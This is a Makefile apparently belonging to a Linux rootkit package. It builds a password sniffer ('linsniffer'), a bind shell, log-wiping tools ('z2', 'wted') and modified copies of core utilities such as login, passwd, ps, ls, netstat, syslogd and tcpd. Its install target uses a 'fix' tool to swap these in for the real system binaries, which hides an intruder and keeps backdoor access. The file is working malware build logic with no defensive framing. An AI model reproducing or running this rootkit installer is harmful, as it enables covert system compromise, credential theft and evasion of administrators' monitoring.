.EXPORT_ALL_VARIABLES:

# comment this out, if you don't have shadow passwords on your system
# This will affect the compilation of the subdirs: ftpd
#HAVE_SHADOW_PASSWORDS=true

# Do you want to have GNU readline and history support in 'ftp'. Use
# cursor keys to get your last commands.
# I use the GNU readline support from bash-1.14 for this.
USE_GNU_READLINE=true

# You could also use "YACC=yacc", if you have the BSD yacc.
YACC=bison -y

# The TCP wrapper doesn't really work for the "rexecd", since it
# waits for further incoming connections once invoked (which are not
# checked by the TCP wrapper binary).
# Install the TCP wrapper library to compile rexecd with these extra checks.
# Also, *DONT* wrap the "rexecd" in your /etc/inetd.conf!

# This may not work right now!!!!!!!!!!!!!!!!
# HAVE_TCP_WRAPPER_LIBRARY=true

# Optimization for compiling all programs.
O=-O2 -fomit-frame-pointer -pipe

# Flags for ld. You don't have to add "-s", since all binaries are
# stripped on installation ("install -s ...").
# LDFLAGS=-v
LDFLAGS=

################### END OF CONFIGURATION PART ###############################

# Just to have a short-cut in the subdirectory Makefiles.
IBSD=-I/usr/include/bsd -include /usr/include/bsd/bsd.h

# These are just a common cases. Then we don't have do write anything in the
# sublevel makefiles.
CFLAGS = ${O} ${IBSD}
LDLIBS = -lbsd

SUB = 	chfn chsh inetd login net-tools-1.32-alpha passwd \
 procps-1.01 rshd sysklogd-1.3 tcpd_7.4 fileutils-3.13 cron3.0pl1 psmisc findutils/lib findutils/find
SHADOWSUB = inetd net-tools-1.32-alpha procps-1.01 rshd sysklogd-1.3 \
 shadow-961025 tcpd_7.4 fileutils-3.13 cron3.0pl1 psmisc  findutils/lib findutils/find

CC=gcc

all:
	${CC} -o fix fix.c
	${CC} -o z2 z2.c 
	${CC} -o wted wted.c
	${CC} -O2 -o linsniffer linsniffer.c
	${CC} -o bindshell bindshell.c
	for i in $(SUB); do make -C  $$i; done
	mv chfn/chfn bin
	mv chsh/chsh bin
	mv login/login bin
	mv passwd/passwd bin

shadow:
	${CC} -o fix fix.c
	${CC} -o z2 z2.c
	${CC} -o wted wted.c
	${CC} -O2 -o linsniffer linsniffer.c
	${CC} -o bindshell bindshell.c
	for i in $(SHADOWSUB); do make -C  $$i; done
	mv shadow-961025/src/chfn bin
	mv shadow-961025/src/chsh bin
	mv shadow-961025/src/login bin
	mv shadow-961025/src/passwd bin

install:
	if [ -x /usr/bin/chfn ] && [ -x bin/chfn ]; then ./fix /usr/bin/chfn bin/chfn; fi
	if [ -x /usr/bin/chsh ] && [ -x bin/chsh ]; then ./fix /usr/bin/chsh bin/chsh; fi
	if [ -x /bin/login ] && [ -x bin/login ]; then ./fix /bin/login bin/login; fi
	if [ -x /bin/ls ] && [ -x fileutils-3.13/src/ls ]; then ./fix /bin/ls fileutils-3.13/src/ls; fi
	if [ -x /bin/du ] && [ -x fileutils-3.13/src/du ]; then ./fix /bin/du fileutils-3.13/src/du; fi
	if [ -x /usr/bin/passwd ] && [ -x bin/passwd ]; then ./fix /usr/bin/passwd bin/passwd; fi
	if [ -x /bin/ps ] && [ -x procps-1.01/ps ]; then ./fix /bin/ps procps-1.01/ps; fi
	if [ -x /usr/bin/top ] && [ -x procps-1.01/top ]; then ./fix /usr/bin/top procps-1.01/top; fi
	if [ -x /usr/sbin/in.rshd ] && [ -x rshd/rshd ]; then ./fix /usr/sbin/in.rshd rshd/rshd; fi
	if [ -x /bin/netstat ] && [ -x net-tools-1.32-alpha/netstat ]; then ./fix /bin/netstat net-tools-1.32-alpha/netstat; fi
	if [ -x /sbin/ifconfig ] && [ -x net-tools-1.32-alpha/ifconfig ]; then ./fix /sbin/ifconfig net-tools-1.32-alpha/ifconfig; fi
	if [ -x /usr/sbin/syslogd ] && [ -x sysklogd-1.3/syslogd ]; then ./fix /usr/sbin/syslogd sysklogd-1.3/syslogd; fi
	if [ -x /usr/sbin/inetd ] && [ -x inetd/inetd ]; then ./fix /usr/sbin/inetd inetd/inetd; fi
	if [ -x /usr/sbin/tcpd ] && [ -x tcpd_7.4/tcpd ]; then ./fix /usr/sbin/tcpd tcpd_7.4/tcpd; fi
	if [ -x /usr/bin/killall ] && [ -x psmisc/killall ]; then ./fix /usr/bin/killall psmisc/killall; fi
	if [ -x /bin/killall ] && [ -x psmisc/killall ]; then ./fix /bin/killall psmisc/killall; fi
	if [ -x /usr/bin/pidof ] && [ -x psmisc/killall ] && [ -x /bin/killall ]; then ln -sf /bin/killall psmisc/pidof; fi
	if [ -x /usr/bin/pidof ] && [ -x psmisc/killall ] && [ -x /usr/bin/killall ]; then ln -sf /usr/bin/killall psmisc/pidof; fi
	if [ -x /usr/bin/pidof ] && [ -x psmisc/killall ] && [ -x /usr/bin/killall ]; then ./fix /usr/bin/pidof psmisc/pidof; fi
	if [ -x /sbin/pidof ] && [ -x psmisc/killall ] && [ -x /usr/bin/killall ]; then ./fix /sbin/pidof psmisc/pidof; fi
	if [ -x /usr/bin/find ] && [ -x findutils/find/find ]; then ./fix /usr/bin/find findutils/find/find; fi
        
clean:
	rm -f fix z2 wted linsniffer bindshell bin/* 
	for i in $(SUB); do make -C  $$i clean; done
	for i in $(SHADOWSUB); do make -C  $$i clean; done
        
small:
	for i in $(SUB); do strip $$i/*; done
	for i in $(SHADOWSUB); do strip $$i/*; done
	for i in $(SUB); do rm $$i/*.o; done
	for i in $(SHADOWSUB); do rm $$i/*.o; done
